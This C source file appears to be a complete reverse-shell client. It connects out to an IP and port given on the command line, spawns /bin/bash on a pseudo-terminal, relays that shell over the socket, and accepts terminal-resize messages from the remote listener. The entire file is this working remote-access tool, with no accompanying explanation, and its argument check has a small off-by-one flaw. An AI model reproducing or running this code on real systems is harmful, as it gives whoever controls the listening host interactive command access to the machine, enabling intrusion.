#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <errno.h>


#define BUFSIZE 2048

unsigned int usecs = 5000;

typedef struct
{
 unsigned char e;
 int x;
 int y;
} ttysize;

int sockfd, ptyfd, useless, pty, ok=1;

int testsig(unsigned char *data, int size)
{
 int e;
 for(e=0;e<size;e++)
 if (data[e]==247)
 {
  return e;
 }
 return -1;
}

char cread(int fd, void *buf, size_t count)
{
 //select...
 struct timeval tv; fd_set readfds;
 tv.tv_sec = 5; tv.tv_usec=0;

 FD_ZERO(&readfds);
 FD_SET(fd, &readfds);

 if (select(fd+1, &readfds, NULL, NULL, &tv)>0)
 {
  if (!FD_ISSET(fd, &readfds))
  goto FAIL;
 }
 else
 {
  goto FAIL;
 }
 
 size_t tbytes = 0; int tmp;
 while(tbytes<count)
 {
  tmp = read(fd, buf+tbytes, count-tbytes);
  if (tmp>0)
  tbytes += tmp;
  else goto FAIL;
 }
 return 1;
 FAIL:
 shutdown(fd, SHUT_RDWR);
 close(fd);
 return 0;
}

char contains(const char *str, char what)
{
 int e;
 for(e=0;e<strlen(str);e++)
 if (str[e]==what)
 return 1;
 return 0;
}

void setsize(ttysize w)
{
 struct winsize ws;
 ioctl(ptyfd, TIOCGWINSZ, &ws);
 ws.ws_col=w.x; ws.ws_row=w.y;
 ioctl(ptyfd, TIOCSWINSZ, &ws); 
}
void *readproc()
{
 char readbuff[BUFSIZE]; char *readbuf = readbuff; int bytes=1, rsig=-1, tmp2=0; ttysize w; w.e=0xf7;
 int stt = sizeof(w);
 while(ok)
 {
  bytes = read(sockfd, readbuf, BUFSIZE);
  if ((bytes==0) || ((bytes < 0) && (errno != EWOULDBLOCK) && (errno != EAGAIN)))
  {
   ok=0; kill(pty, 9); break;
  }
  if (bytes>0 && rsig>0)
  {
   if (bytes<(stt-rsig))
   tmp2=bytes; else tmp2=stt-rsig;
   memcpy((char *)&w+rsig, readbuf, tmp2);
   rsig+=tmp2;
   if (rsig==stt)
   {
    setsize(w);
    rsig=-1;
    readbuf+=tmp2;
    bytes-=tmp2;
   }
   else {bytes=0;tmp2=0;}
  }
  while (bytes>0 && rsig==-1 && (rsig = testsig((unsigned char *)readbuf, bytes))>=0)
  {
   if ((bytes-rsig)>=stt) //complete struct winsize
   {
    memcpy(&w, readbuf+rsig, stt);
    for(tmp2=rsig;tmp2<(bytes-stt);tmp2++)
    {
     readbuf[tmp2] = readbuf[tmp2+stt];
    }
    rsig=-1;
    bytes-=stt;
    tmp2=0;
    setsize(w);
   }
   else
   {
    memcpy((char *)&w, readbuf+rsig, bytes-rsig);
    rsig = bytes-rsig;
    bytes-=rsig;
   }
  }
  if (bytes>0) write(ptyfd, readbuf, bytes);
  if (tmp2)
  {
   readbuf-=tmp2;
   bytes+=tmp2;
   tmp2=0;
  }
  usleep(usecs);
 }
}

void *writeproc()
{
 char readbuf[BUFSIZE]; int bytes=1;
 while(ok)
 {
  bytes = read(ptyfd, readbuf, BUFSIZE);
  if (bytes>0) write(sockfd, readbuf, bytes);
  usleep(usecs);
 }
}

int main(int argc, char **argv)
{
 int port;

 if (argc<2 || ((port = atoi(argv[2]))<0) || port>65535)
 {
  fprintf(stderr, "%s [ip] [port]\n", argv[0]);
  return 0;
 }

 char clause;
 if (!contains(argv[1], ':'))
 {  
  struct sockaddr_in serv_addr = {0};
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(port);
  inet_pton(AF_INET, argv[1], &(serv_addr.sin_addr.s_addr));
  clause = connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
 }
 else
 {
  struct sockaddr_in6 serv_addr = {0};
  sockfd = socket(AF_INET6, SOCK_STREAM, 0);
  serv_addr.sin6_family = AF_INET6;
  serv_addr.sin6_port = htons(port);
  inet_pton(AF_INET6, argv[1], &(serv_addr.sin6_addr));
  clause = connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
 }

 if (clause<0)
 {
  fprintf(stderr, "Cannot connect!\n"); fflush(stdout);
  exit(0);
 }

 //now we'll read tty size

 ttysize ts; ts.e = 0xf7;
 int ttt=0;
 if (!cread(sockfd, (char *)&ts, sizeof(ts)))
 return;

 char term[1030]; strcpy(term, "TERM="); ttt=strlen(term);
 if (!cread(sockfd, term+ttt, 1030-ttt))
 return;

 struct winsize w;
 ioctl(STDOUT_FILENO, TIOCGWINSZ, &w);

 w.ws_col=ts.x;w.ws_row=ts.y;

 pty = forkpty(&ptyfd, NULL, NULL, &w);
 
 if (!pty)
 {
  char *environ[] = {"", term, NULL};
  execle("/bin/bash", "bash", NULL, environ);
  exit(0);
 }

 int flags = fcntl(ptyfd, F_GETFL, 0);
 fcntl(ptyfd, F_SETFL, flags | O_NONBLOCK);

 flags = fcntl(sockfd, F_GETFL, 0);
 fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

 pthread_t reader, writer;
 
 pthread_create(&reader, NULL, readproc, NULL);
 pthread_create(&writer, NULL, writeproc, NULL);

 int state;
 pid_t tt = waitpid(pty, &state, 0);
 ok=0;

 pthread_join(reader, NULL);
 pthread_join(writer, NULL);

 close(sockfd); close(ptyfd);
}